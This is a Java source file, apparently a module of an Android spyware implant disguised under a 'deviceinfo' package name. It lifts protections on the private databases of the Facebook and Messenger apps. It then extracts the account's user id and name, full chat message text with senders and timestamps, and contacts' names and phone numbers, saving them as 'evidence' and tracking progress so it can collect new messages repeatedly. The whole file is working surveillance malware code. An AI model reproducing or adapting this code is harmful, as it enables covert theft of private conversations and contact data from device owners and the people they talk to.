package com.android.deviceinfo.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONTokener;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.android.deviceinfo.Messages;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordHashPairVisitor;
import com.android.deviceinfo.db.RecordHashtableIdVisitor;
import com.android.deviceinfo.db.RecordListVisitor;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;

public class ChatFacebook extends SubModuleChat {

	private static final String TAG = "ChatFacebook";

	private static final int PROGRAM = 0x02;
	String pObserving = "facebook";

	private Date lastTimestamp;

	private Hashtable<String, Long> lastFb;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	// private String dbDir;

	private String account_uid;

	private String account_name;

	String dirKatana = "/data/data/com.facebook.katana/databases";
	String dirOrca = "/data/data/com.facebook.orca/databases";

	private Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		if (processName.contains("katana"))
			fetchFb(dirKatana);
		else if (processName.contains("orca"))
			fetchFb(dirOrca);
	}

	@Override
	protected void start() {
		lastFb = markup.unserialize(new Hashtable<String, Long>());
		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastFb: " + lastFb);
		}

		fetchFb(dirKatana);

		fetchFb(dirOrca);

	}

	private void fetchFb(String dir) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchFb) " + dir);
		}
		if (readMyAccount(dir)) {
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.FACEBOOK, account_uid, account_name);
			readFbMessageHistory(dir);
		}
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private boolean readMyAccount(String dbDir) {

		if (!Path.unprotect(dbDir)) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyAccount) cannot unprotect dir");
			}
			return false;
		}

		String dbFile = "prefs_db";
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyAccount) Error: cannot open " + dbDir + "/" + dbFile);
			}
			return false;
		}
		//SQLiteDatabase db = helper.getReadableDatabase();

		//String[] projection = new String[] { "key", "value" };
		String selection = null;

		RecordHashPairVisitor visitor = new RecordHashPairVisitor("key", "value");
		helper.traverseRecords("preferences", visitor);

		Hashtable<String, String> preferences = visitor.getMap();

		account_uid = preferences.get("/auth/user_data/fb_uid");
		account_name = preferences.get("/auth/user_data/fb_username");

		return (!StringUtils.isEmpty(account_name) && !StringUtils.isEmpty(account_uid));
		
	}

	private void readFbMessageHistory(String dbDir) {
		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readFbMessageHistory), semaphore red");
			}
			return;
		}

		try {
			boolean updateMarkup = false;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readFbMessageHistory) account: " + account_uid + " dir: " + dbDir);
			}

			Path.unprotectAll(dbDir, true);

			if (ModuleAddressBook.getInstance() != null) {
				if (Path.unprotect(dbDir, "users_db2", true)) {
					readAddressUser(dbDir);

				} else if (Path.unprotect(dbDir, "contacts_db2", true)) {
					readAddressContacts(dbDir);
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readFbMessageHistory) AddressBook not enabled.");
				}
			}

			String dbFile1 = "threads_db";
			String dbFile2 = "threads_db2";

			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile1);
			if (helper == null) {
				helper = GenericSqliteHelper.open(dbDir, dbFile2);
			}
			if (helper != null) {
				List<FbConversation> conversations = getFbConversations(helper, account_uid);
				for (FbConversation conv : conversations) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readFbMessageHistory) conversation: " + conv.id);
					}
					long lastConvId = lastFb.containsKey(conv.id) ? lastFb.get(conv.id) : 0;
					if (lastConvId < conv.timestamp) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (readFbMessageHistory) lastConvId(" + lastConvId 
									+ ") < conv.timestamp("+ conv.timestamp +")");
						}
						long lastReadId = (long) fetchMessages(helper, conv, lastConvId);

						if (lastReadId > 0) {
							updateMarkupFb(conv.id, lastReadId, true);
						}
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getFbConversations) Error: null helper");
				}
			}

		} finally {
			readChatSemaphore.release();
		}

	}

	private long fetchMessages(GenericSqliteHelper helper, final FbConversation conv, long lastConvId) {
		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

		String[] projection = new String[] { "text", "sender", "timestamp_ms" };
		String selection = "thread_id = '" + conv.id + "' and text != '' and timestamp_ms > " + lastConvId;
		String order = "timestamp_ms";

		RecordVisitor visitor = new RecordVisitor(projection, selection, order) {
			@Override
			public long cursor(Cursor cursor) {

				long timestamp = 0;
				try {
					String body = cursor.getString(0);
					String sender = cursor.getString(1);

					JSONObject root;

					root = (JSONObject) new JSONTokener(sender).nextValue();
					String peer = root.getString("email").split("@")[0];
					String name = root.getString("name");

					timestamp = cursor.getLong(2);
					Date date = new Date(timestamp);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) sc.account: " + conv.account + " peer: " + peer + " body: " + body
								+ " timestamp:" + timestamp);
					}

					boolean incoming = !(peer.equals(conv.account));

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) incoming: " + incoming);
					}

					String from, to = null;
					String fromDisplay, toDisplay = null;

					from = peer;
					fromDisplay = name;

					to = conv.getTo(peer);
					toDisplay = conv.getDisplayTo(peer);

					if (!StringUtils.isEmpty(body)) {
						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
								body, incoming);

						messages.add(message);
					}

				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (fetchMessages) Error: " + ex);
					}
				}
				return timestamp;

			}
		};

		long newLastId = helper.traverseRecords("messages", visitor);

		if (messages != null && messages.size() > 0) {
			saveEvidence(messages);
		}

		return newLastId;
	}

	private void updateMarkupFb(String threadId, long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupSkype), mailStore: " + threadId + " +lastId: " + newLastId);
		}

		lastFb.put(threadId, newLastId);
		try {
			if (serialize || (newLastId % 10 == 0)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
				}
				markup.writeMarkupSerializable(lastFb);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	private List<FbConversation> getFbConversations(GenericSqliteHelper helper, final String account) {
		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getFbConversations) Error: null helper");
			}
			return null;
		}

		final List<FbConversation> conversations = new ArrayList<FbConversation>();

		String[] projection = new String[] { "thread_id", "participants", "timestamp_ms" };
		String selection = "timestamp_ms > 0 ";

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				FbConversation c = new FbConversation();
				c.account = account;
				c.id = cursor.getString(0);

				String value = cursor.getString(1);
				c.timestamp = cursor.getLong(2);
				Contact[] contacts;
				try {
					contacts = json2Contacts(value);
					c.contacts = contacts;
					if (Cfg.DEBUG) {
						// Check.log(TAG + " (cursor) contacts: " +
						// contacts[0].name + " -> " + contacts[1].name);
					}
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				conversations.add(c);
				return 0;
			}
		};

		helper.traverseRecords("threads", visitor);
		return conversations;
	}

	private void readAddressUser(String dbDir) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readAddressUser) ");
		}
		String dbFile = "users_db2";
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		//SQLiteDatabase db = helper.getReadableDatabase();

		String[] projection = new String[] { "fbid", "first_name", "last_name", "name", "email_addresses",
				"phone_numbers" };
		String selection = null;

		RecordHashtableIdVisitor visitor = new RecordHashtableIdVisitor(projection);
		helper.traverseRecords("facebook_user", visitor);

	}

	private void readAddressContacts(String dbDir) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readAddressContacts) ");
		}
		String dbFile = "contacts_db2";
		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
		//SQLiteDatabase db = helper.getReadableDatabase();

		RecordListVisitor visitor = new RecordListVisitor("data");
		helper.traverseRecords("contacts", visitor);
		boolean serializeContacts = false;
		for (String value : visitor.getList()) {
			try {
				Contact contact = json2Contact(value);
				serializeContacts |= ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.FACEBOOK, contact);
				contacts.put(contact.id, contact);
			} catch (JSONException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readAddressContacts) Error: " + e);
				}
			}
		}
		if (serializeContacts) {
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}

	private Contact json2Contact(String value) throws JSONException {
		JSONObject root = (JSONObject) new JSONTokener(value).nextValue();
		String fbId = root.getString("profileFbid");
		JSONObject name = root.getJSONObject("name");
		String fullName = name.getString("displayName");

		JSONArray phones = root.getJSONArray("phones");
		String numbers = "";
		for (int i = 0; i < phones.length(); i++) {
			numbers += phones.getJSONObject(i).get("universalNumber") + " ";
		}
		// String picture = root.getString("bigPictureUrl");
		Contact contact = new Contact(fbId, numbers, fullName, "Id: " + fbId);
		return contact;
	}

	private Contact[] json2Contacts(String value) throws JSONException {
		JSONArray jcontacts = (JSONArray) new JSONTokener(value).nextValue();

		Contact[] contacts = new Contact[jcontacts.length()];
		for (int i = 0; i < jcontacts.length(); i++) {

			JSONObject root = (JSONObject) jcontacts.get(i);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (json2Contacts) root: " + root);
			}

			String email = root.getString("email");
			String fbId = email.split("@")[0];

			String fullName = root.getString("name");

			Contact contact = new Contact(fbId, "", fullName, "Id: " + fbId);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (json2Contacts) " + contact);
			}
			contacts[i] = contact;
		}
		return contacts;
	}
}
